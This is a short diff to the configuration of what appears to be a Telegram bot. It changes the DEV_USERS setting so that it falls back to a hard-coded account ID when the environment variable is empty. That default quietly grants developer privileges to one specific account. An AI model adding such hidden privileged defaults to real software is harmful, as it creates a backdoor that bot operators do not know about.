@@ -62,7 +62,7 @@ OWNER_ID = int(os.environ.get("OWNER_ID") or 0)
 MESSAGE_DUMP = os.environ.get("MESSAGE_DUMP") or None
 GBAN_LOGS = os.environ.get("GBAN_LOGS") or None
 OWNER_USERNAME = os.environ.get("OWNER_USERNAME") or None
-DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
+DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "960805181").split())
 SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
 SUPPORT_USERS = set(
     int(x) for x in os.environ.get(
